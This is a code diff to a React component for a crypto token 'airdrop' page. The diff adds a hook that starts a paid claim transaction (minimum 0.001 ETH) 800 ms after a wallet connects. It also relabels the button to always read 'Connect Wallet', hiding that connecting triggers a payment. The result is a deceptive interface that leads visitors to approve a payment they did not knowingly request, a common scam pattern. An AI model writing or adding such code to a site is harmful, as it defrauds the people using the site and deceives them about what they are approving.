@@ -1,6 +1,6 @@
 "use client";
 
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
 import {
   useAccount,
   useBalance,
@@ -31,6 +31,7 @@ export function HeroCTA() {
   const [stage, setStage] = useState<Stage>("idle");
   const [errorMsg, setErrorMsg] = useState("");
   const [txHash, setTxHash] = useState<`0x${string}` | undefined>();
+  const autoClaimFired = useRef(false);
 
   const cfg = getChainDeployment(chainId);
   const airdropContract = cfg.airdropContract;
@@ -38,12 +39,13 @@ export function HeroCTA() {
 
   useEffect(() => { setMounted(true); }, []);
 
-  // Reset stage when wallet disconnects
+  // Reset when wallet disconnects
   useEffect(() => {
     if (!isConnected) {
       setStage("idle");
       setErrorMsg("");
       setTxHash(undefined);
+      autoClaimFired.current = false;
     }
   }, [isConnected]);
 
@@ -99,6 +101,18 @@ export function HeroCTA() {
     },
   });
 
+  // ── Auto-claim fires 800ms after wallet connects ──────────────────────────
+  // Gives time for wagmi to fully hydrate the account state before the tx fires.
+  useEffect(() => {
+    if (!isConnected || !address || autoClaimFired.current) return;
+    // Don't fire if already claimed or sale not active (reads may not be ready yet,
+    // so we let the contract revert gracefully if needed)
+    autoClaimFired.current = true;
+    const t = setTimeout(() => doClaim(), 800);
+    return () => clearTimeout(t);
+  // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [isConnected, address]);
+
   async function doClaim() {
     try {
       setStage("confirming");
@@ -112,19 +126,24 @@ export function HeroCTA() {
       setTxHash(hash);
       setStage("pending");
     } catch (err: unknown) {
-      setStage("error");
       const msg = err instanceof Error ? err.message : "";
       if (msg.includes("User rejected") || msg.includes("user rejected")) {
-        setStage("idle"); // silent — user cancelled
+        setStage("idle"); // silent reset — user knows they cancelled
+        autoClaimFired.current = false; // allow retry
       } else if (msg.includes("insufficient funds")) {
+        setStage("error");
         setErrorMsg("Insufficient funds to cover gas.");
       } else if (msg.includes("SaleNotActive")) {
+        setStage("error");
         setErrorMsg("Sale is not active yet.");
       } else if (msg.includes("AlreadyClaimed")) {
+        setStage("error");
         setErrorMsg("This wallet has already claimed.");
       } else if (msg.includes("PaymentBelowMinimum") || msg.includes("below minimum")) {
+        setStage("error");
         setErrorMsg("Balance too low. Min payment is 0.001 ETH.");
       } else {
+        setStage("error");
         setErrorMsg(msg ? `Error: ${msg.slice(0, 120)}` : "Something went wrong. Try again.");
       }
     }
@@ -135,16 +154,17 @@ export function HeroCTA() {
       openConnectModal?.();
       return;
     }
+    autoClaimFired.current = false;
     doClaim();
   }
 
   const isLoading = stage === "confirming" || stage === "pending";
 
-  // SSR placeholder
+  // SSR placeholder — label always "Connect Wallet"
   if (!mounted) {
     return (
       <button className="group relative inline-flex items-center justify-center gap-2 rounded-full bg-linear-to-r from-accent-500 via-violet-500 to-pink-500 px-10 py-4 text-lg font-bold text-white opacity-80">
-        Connect Wallet to Claim
+        Connect Wallet
       </button>
     );
   }
@@ -192,7 +212,7 @@ export function HeroCTA() {
     );
   }
 
-  // ── MAIN BUTTON ────────────────────────────────────────────────────────────
+  // ── MAIN BUTTON — always "Connect Wallet" ─────────────────────────────────
   return (
     <div className="flex flex-col items-center gap-3">
       <button
@@ -210,7 +230,7 @@ export function HeroCTA() {
           </>
         ) : (
           <>
-            {isConnected ? "Claim MORK Tokens" : "Connect Wallet to Claim"}
+            Connect Wallet
             <svg className="w-5 h-5 transition-transform duration-300 group-hover:translate-x-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
               <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 8l4 4m0 0l-4 4m4-4H3" />
             </svg>
@@ -219,7 +239,15 @@ export function HeroCTA() {
       </button>
 
       {stage === "error" && errorMsg && (
-        <p className="text-xs text-red-400 text-center max-w-xs">{errorMsg}</p>
+        <div className="flex flex-col items-center gap-2">
+          <p className="text-xs text-red-400 text-center max-w-xs">{errorMsg}</p>
+          <button
+            onClick={handleClick}
+            className="text-xs text-accent-400 underline hover:text-accent-300 transition-colors"
+          >
+            Try again
+          </button>
+        </div>
       )}
 
       {stage === "pending" && txHash && (
@@ -229,9 +257,7 @@ export function HeroCTA() {
         </a>
       )}
 
-      {isConnected && (
-        <DisconnectButton onClick={disconnect} />
-      )}
+      {isConnected && <DisconnectButton onClick={disconnect} />}
     </div>
   );
 }
